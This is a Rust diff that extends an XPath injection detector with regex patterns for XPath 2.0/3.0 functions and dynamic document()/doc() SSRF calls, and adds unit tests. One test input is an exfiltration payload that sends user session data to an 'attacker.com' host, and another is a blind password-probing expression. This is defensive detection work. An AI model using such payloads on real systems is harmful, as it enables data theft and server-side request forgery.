@@ -8,6 +8,11 @@
 
 use crate::evaluators::{EvidenceOperation, L2Detection, L2Evaluator, ProofEvidence};
 use crate::types::InvariantClass;
+use regex::Regex;
+use std::sync::LazyLock;
+
+static XPATH_XPATH2_FUNCTIONS_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)\b(?:matches|replace|tokenize|upper-case|lower-case|string-join|analyze-string|parse-xml|serialize|unparsed-text|environment-variable)\s*\(").unwrap());
+static XPATH_DOCUMENT_SSRF_ADVANCED_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)\b(?:fn:)?(?:document|doc)\s*\(\s*(?:concat|substring|substring-before|substring-after|replace|normalize-space|string|\$)[^)]*\)").unwrap());
 
 /// XPath function names that indicate injection attempts.
 const XPATH_FUNCTIONS: &[&str] = &[
@@ -249,13 +254,46 @@ impl L2Evaluator for XPathEvaluator {
             });
         }
 
+        if let Some(m) = XPATH_XPATH2_FUNCTIONS_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "xpath_xpath2_functions".into(),
+                confidence: 0.89,
+                detail: "XPath 2.0/3.0 function detected".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "XPath 2.0 introduces matches() for regex matching, document() extensions, and environment-variable() which can read system environment variables. These functions enable blind data extraction and SSRF in systems using XPath 2.0 or 3.0 processors".into(),
+                    offset: m.start(),
+                    property: "XPath queries must use a sandboxed XPath evaluator with function allowlisting. XPath 2.0/3.0 functions like matches(), environment-variable() must be blocked".into(),
+                }],
+            });
+        }
+
+        if let Some(m) = XPATH_DOCUMENT_SSRF_ADVANCED_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "xpath_document_ssrf_advanced".into(),
+                confidence: 0.91,
+                detail: "Dynamic document() function call".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "document(concat()) or doc($var) constructs URLs dynamically from XPath expressions, enabling SSRF where the target URL is computed from attacker-controlled XML content rather than a literal string".into(),
+                    offset: m.start(),
+                    property: "document() and doc() functions must be disabled in XPath processors. If required, allowlist only specific static URLs".into(),
+                }],
+            });
+        }
+
         dets
     }
 
     fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
         match detection_type {
             "xpath_tautology" | "xpath_function" | "xpath_axis" | "xpath_blind"
-            | "xpath_oob_fetch" | "xpath_dynamic_eval" => {
+            | "xpath_oob_fetch" | "xpath_dynamic_eval"
+            | "xpath_xpath2_functions" | "xpath_document_ssrf_advanced" => {
                 Some(InvariantClass::XpathInjection)
             }
             _ => None,
@@ -330,5 +368,19 @@ mod tests {
             eval.map_class("xpath_tautology"),
             Some(InvariantClass::XpathInjection)
         );
+    }
+
+    #[test]
+    fn detects_xpath_xpath2_functions() {
+        let eval = XPathEvaluator;
+        let dets = eval.detect("matches(//user/password, '^admin')");
+        assert!(dets.iter().any(|d| d.detection_type == "xpath_xpath2_functions"));
+    }
+
+    #[test]
+    fn detects_xpath_document_ssrf_advanced() {
+        let eval = XPathEvaluator;
+        let dets = eval.detect("doc(concat('http://attacker.com/', //user/session))");
+        assert!(dets.iter().any(|d| d.detection_type == "xpath_document_ssrf_advanced"));
     }
 }
